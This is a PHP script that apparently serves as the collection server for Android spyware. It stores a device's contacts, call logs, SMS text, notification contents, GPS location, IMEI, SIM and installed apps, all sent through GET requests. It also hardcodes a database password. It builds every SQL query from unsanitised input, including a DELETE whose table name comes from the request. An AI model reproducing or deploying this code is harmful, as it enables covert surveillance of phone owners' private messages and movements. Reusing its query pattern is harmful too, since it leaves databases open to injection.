<?php

// MySQL Credentals
$dbhost = "localhost";
$dbun = "id3440988_project";
$dbpw = "Jenix321";
$dbname = "id3440988_asspy";
$conn = mysqli_connect($dbhost, $dbun, $dbpw, $dbname);

if (isset($_GET['user'])) {
    $user = $_GET['user'];

    ////
    // Insert Contacts
    ////
    if (isset($_GET['name']) && isset($_GET['phoneNumber'])) {

        $name = $_GET['name'];
        $phoneNumber = $_GET['phoneNumber'];

        $query = "INSERT INTO contacts (name, phoneNumber, user) VALUES ('$name', '$phoneNumber', '$user')";

        if(mysqli_query($conn, $query))
        {
            echo "success";
        }
        else
        {
            echo "failed";
        }
    }

    ////
    // Insert Call Log
    ////
    if (isset($_GET['callType']) && isset($_GET['callDate'])) {

        $callNumber = $_GET['callNumber'];
        $callDate = $_GET['callDate'];
        $callDurationSeconds = $_GET['callDurationSeconds'];
        $callType = $_GET['callType'];

        $query = "INSERT INTO calllog (callNumber, callDate, callDurationSeconds, callType, user)
                    VALUES ('$callNumber', '$callDate', '$callDurationSeconds', '$callType', '$user')";

        if(mysqli_query($conn, $query))
        {
            echo "success";
        }
        else
        {
            echo "failed";
        }

    }

    ////
    // Insert SMS
    ////
    if (isset($_GET['address']) && isset($_GET['body']) && isset($_GET['type'])) {

        $address = $_GET['address'];
        $body = $_GET['body'];
        $type = $_GET['type'];
        $date = $_GET['date'];

        $query = "INSERT INTO sms (address, body, type, user, date)
                    VALUES ('$address', '$body', '$type', '$user', '$date')";

        if(mysqli_query($conn, $query))
        {
            echo "success";
        }
        else
        {
            echo "failed";
        }
    }

    ////
    // Insert Notifications
    ////
    if (isset($_GET['notif'])) {

        $notiftype = $_GET['notiftype'];
        $content = $_GET['notifcontent'];
        $receivedTime = $_GET['receivedTime'];
        $sender = $_GET['sender'];

        $query = "INSERT INTO notification (notiftype, content, receivedTime, sender, user)
                    VALUES ('$notiftype', '$content', '$receivedTime', '$sender', '$user')";

        if(mysqli_query($conn, $query))
        {
            echo "success";
        }
        else
        {
            echo "failed";
        }
    }

    ////
    // Insert Location
    ////
    if (isset($_GET['lat']) && isset($_GET['long'])) {
        $lat = $_GET['lat'];
        $lon = $_GET['long'];
        $locdate = $_GET['locdate'];

        $query = "INSERT INTO location (lon, lat, date, user)
                    VALUES ('$lon', '$lat', '$locdate', '$user')";

        if(mysqli_query($conn, $query))
        {
            echo "success";
        }
        else
        {
            echo "failed";
        }
    }

    ////
    // Delete Device Info
    ////
    if (isset($_GET['deletedevice']) && isset($_GET['lastupdated'])) {

        $del = $_GET['delete'];
        $lastupdated = $_GET['lastupdated'];

        $query = "DELETE FROM device WHERE user='$user' AND lastupdated!='$lastupdated'";

        if(mysqli_query($conn, $query))
        {
            echo "success";
        }
        else
        {
            echo "failed";
        }
    }

    ////
    // Insert Device Info
    ////
    if (isset($_GET['model']) && isset($_GET['version'])) {
        $model = $_GET['model'];
        $version = $_GET['version'];
        $device = $_GET['device'];
        $ssid = $_GET['ssid'];
        $sim = $_GET['sim'];
        $longitude = $_GET['lon'];
        $latitude = $_GET['latt'];

        $manufacturer = $_GET['manufacturer'];
        $apiver = $_GET['apiver'];
        $androidver = $_GET['androidver'];
        $imei = $_GET['imei'];
        $battery = "incoming";
        $framework = $_GET['framework'];
        
        $lastupdated = $_GET['lastupdated'];

        $query = "INSERT INTO device (model, device, version, ssid, sim,
        manufacturer, apiver, androidver, imei, battery, framework, longitude, latitude, user, lastupdated)
            VALUES ('$model', '$device', '$version', '$ssid', '$sim',
            '$manufacturer', '$apiver', '$androidver', '$imei', '$battery', '$framework','$longitude', '$latitude', '$user', '$lastupdated')";

        if(mysqli_query($conn, $query))
        {
            echo "success";
        }
        else
        {
            echo "failed";
        }
    }



    ////
    // Insert Installed Apps
    ////
    if (isset($_GET['pckname']) && isset($_GET['sourcedir'])) {
        $pckname = $_GET['pckname'];
        $sourcedir = $_GET['sourcedir'];
        $appname = $_GET['appname'];

        $query = "INSERT INTO apps (appname, pckname, sourcedir, user)
                    VALUES ('$appname', '$pckname', '$sourcedir', '$user')";

        if(mysqli_query($conn, $query))
        {
            echo "success";
        }
        else
        {
            echo "failed";
        }
    }

    ////
    // Delete
    ////
    if (isset($_GET['delete']) && isset($_GET['user']) && !isset($_GET['deletesms']) && !isset($_GET['deletecall'])) {

        $del = $_GET['delete'];
        $user = $_GET['user'];

        $query = "DELETE FROM $del WHERE user='$user'";

        if(mysqli_query($conn, $query))
        {
            echo "success";
        }
        else
        {
            echo "failed";
        }
    }

    ////
    // Delete SMS
    ////
    if (isset($_GET['deletesms']) && isset($_GET['type'])) {

        $user = $_GET['user'];
        $type = $_GET['type'];
        $smsdate = $_GET['smsdate'];

        $query = "DELETE FROM sms WHERE user='$user' AND type='$type' AND date='$smsdate'";

        if(mysqli_query($conn, $query))
        {
            echo "success";
        }
        else
        {
            echo "failed";
        }
    }

     ////
    // Delete Call Log
    ////
    if (isset($_GET['deletecall']) && isset($_GET['callDate'])) {

        $user = $_GET['user'];
        $callDate = $_GET['callDate'];

        $query = "DELETE FROM calllog WHERE user='$user' AND callDate='$callDate'";

        if(mysqli_query($conn, $query))
        {
            echo "success";
        }
        else
        {
            echo "failed";
        }
    }

    mysqli_close($conn);

}

?>